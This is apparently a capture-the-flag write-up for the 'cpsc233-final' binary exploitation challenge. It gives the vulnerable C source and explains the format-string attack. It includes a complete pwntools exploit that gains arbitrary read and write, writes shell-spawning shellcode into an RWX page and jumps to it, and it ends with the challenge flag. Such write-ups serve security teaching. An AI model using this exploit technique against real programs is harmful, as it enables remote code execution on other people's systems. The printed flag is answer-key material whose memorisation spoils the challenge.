# cpsc233-final

## Challenge

We are provided a binary and C source code.

The program uses an interactive prompt to display information about the program and accept user data.

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### main

```c
int main() {
    init_chall();
    char * func = mmap((void*)0x2333000,0x1000,7,0x21,0,0);
    char * feedback = malloc(0x18);
    char name[8];
    long exam_id = (long) &name;
    printf("======== Final Exam (Your Exam ID: 0x%lx)========\n",exam_id);
    puts("Enter your name: ");
    read(0,&name[0],0xc);
    printf("Good luck on your final, %s",name);
    puts("please put your function shellcode here: ");
    if (!read_shellcode(func,2)) {
        puts("fail to read shellcode, please check your shellcode");
        exit(-1);
    };
    final_exam((void *)func);
    puts("pleas give us feedback about this course: ");
    read(0,feedback,0x18);
    puts("feedback submitted: ");
    printf(feedback);
    // exit final environment
    exit(0);
    return 0;
}
```

## Solution

We are given a stack address leak and allowed to store 12 bytes onto the stack.
The last 4 bytes of this input will overflow into the stack canary, but this does not seem to matter.
It is not useful as we do not have control over the upper bytes, but does not negatively impact the program as we do not return from main, so the canary is never checked.

There is a format string vulnerability at the end of the `main` function.
As the program exits at the end of `main`, we need to use this format string vulnerability to control RIP and avoid the `exit` call.

While we do not return from `main`, we will return into `main` after the `printf` call.
We can calculate RSP from the stack leak to determine the address we need to write to in order to change RIP.
We don't have an ASLR leak yet, so we can only reliably change the last byte.
We can change the last byte to before the final `read` call, allowing us to send another format string.
In the same payload, we leak the executable address by printing the return address as a string, dereferencing the same pointer we used to write to the stack.

Now that we have a stack leak and ASLR leak, we can set up our aribtrary read and write.
We still need a pointer to RSP-8 so we can overwrite the `printf` return each loop, so we need another pointer for other actions.
One option is to use the environment variable pointers, we can overwrite the lower bytes of one to point anywhere on the stack, then use it to read or write anywhere in memory.

The disadvantage to using environment variable pointers is that it depends on the target environment.
Instead, we can return back to the prologue of `main`, just after the `push rbp` instruction.
This will still setup a new stack frame without messing up alignment.
The new stack frame also comes with a new pair of pointers on the stack.

Now we have 2 pairs of pointers.
We can set one of them to the new RSP-8 and use it for all future loops.
We are now free to use the 12-byte read to place arbitrary address on the stack for reading and writing.

We're giving a RWX page for free, so we can write shellcode here byte-by-byte.

Once we're finished, we can jump to it by overwriting the lower bytes of the `printf` return.
For this, we can use the `pop rbp ; ret` gadget at `main-2` to take advantage of the fact that the rwx page address is already on the stack.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host cpsc233-final.ctf.maplebacon.org --port 1337 cpsc233_final
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('cpsc233_final')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'cpsc233-final.ctf.maplebacon.org'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *main+303
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

rsp = None

# this page may move due to stack shenanigans
rwx = 0x00000002333000

def setup(io):
    global rsp

    # initial main
    # goal is to leak exe base and loop into main before the fmt string read

    io.recvuntil(b'======== Final Exam (Your Exam ID: ')
    rsp = int(io.recvuntil(b')========\n', drop=True), 0) - 0x20
    info(f'rsp: {hex(rsp)}')

    io.recvuntil(b'Enter your name: \n')
    io.send(pack(rsp - 0x8))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    offset = 245
    ret_write = (exe.sym['main'] + offset) & 0xff
    fmt = f'%{ret_write}c%10$hhn||%10$s||\0'
    io.send(fmt.encode())
    io.recvuntil(b'||')
    exe.address = (
            unpack(io.recvuntil(b'||', drop=True).ljust(8, b'\x00'))
            - (exe.sym['main'] + offset)
    )
    info(f'exe.address: {hex(exe.address)}')

    # main+offset
    # goal is to loop back to main+1, so a new stack is made without pushing rbp

    io.recvuntil(b'pleas give us feedback about this course: ')
    ret_write = (exe.sym['main'] + 1) & 0xffff
    fmt = f'%{ret_write}c%10$hn\0'
    io.send(fmt.encode())
    old_stack = rsp - 0x8
    rsp -= 0x30
    new_stack = rsp - 0x8

    # stack groom
    # keep shifting stack by 0x30 until pointers match except the last byte

    while old_stack & 0xffffffffffffff00 != new_stack & 0xffffffffffffff00:
        io.recvuntil(b'Enter your name: \n')
        io.send(pack(rsp - 0x8))

        io.recvuntil(b'please put your function shellcode here: \n')
        io.send(b'90')

        io.recvuntil(b'pleas give us feedback about this course: ')
        ret_write = (exe.sym['main'] + 1) & 0xffff
        fmt = f'%{ret_write}c%10$hn\0'
        io.send(fmt.encode())
        old_stack = rsp - 0x8
        rsp -= 0x30
        new_stack = rsp - 0x8

    # main+1, new stack
    # begin setting up arbitrary actions

    io.recvuntil(b'Enter your name: \n')
    io.send(pack(rsp - 0x8))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    ret_write = (exe.sym['main'] + 120) & 0xffff
    write_byte = ((rsp - 0x8) - ret_write) % 0x100
    if write_byte <= 0x0:
        write_byte += 0x100
    fmt = f'%{ret_write}c%10$hn%{write_byte}c%15$hhn'
    io.send(fmt.encode())

    # offset 16 can now overwrite the printf return
    # this frees the name field for arbitrary actions

def write_byte(addr, val):
    io.recvuntil(b'Enter your name: \n')
    io.send(pack(addr))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    ret_write = (exe.sym['main'] + 120) & 0xffff
    write_byte = (val - ret_write) % 0x100
    if write_byte <= 0x0:
        write_byte += 0x100
    fmt = f'%{ret_write}c%16$hn%{write_byte}c%10$hhn'
    io.send(fmt.encode())

def leak_ptr(addr):
    io.recvuntil(b'Enter your name: \n')
    io.send(pack(addr))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    ret_write = (exe.sym['main'] + 120) & 0xffff
    fmt = f'%{ret_write}c%16$hn||%10$s||\0'
    io.send(fmt.encode())
    io.recvuntil(b'||')
    return unpack(io.recvuntil(b'||', drop=True).ljust(8, b'\x00'))

def jump_to_shellcode():
    # we assume that rwx is written to rsp + 8
    io.recvuntil(b'Enter your name: \n')
    io.send(pack(0))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    # pop rbp ; ret ;
    ret_write = (exe.sym['main'] - 2) & 0xffff
    fmt = f'%{ret_write}c%16$hn\0'
    io.send(fmt.encode())

io = start()

setup(io)

# lowest 12 bits expected to be null, need to leak at offset
rwx = leak_ptr(rsp + 0x8 + 1) << 8
info(f'rwx: {hex(rwx)}')

shellcode = asm(shellcraft.sh())

# start at offset 1 because of the NOP
i = 1
for b in shellcode:
    write_byte(rwx + i, b)
    i += 1

jump_to_shellcode()

io.interactive()
```

## Flag

```
maple{r34d_5h3llc0d3_u51n6_5h3llc0d3}
```
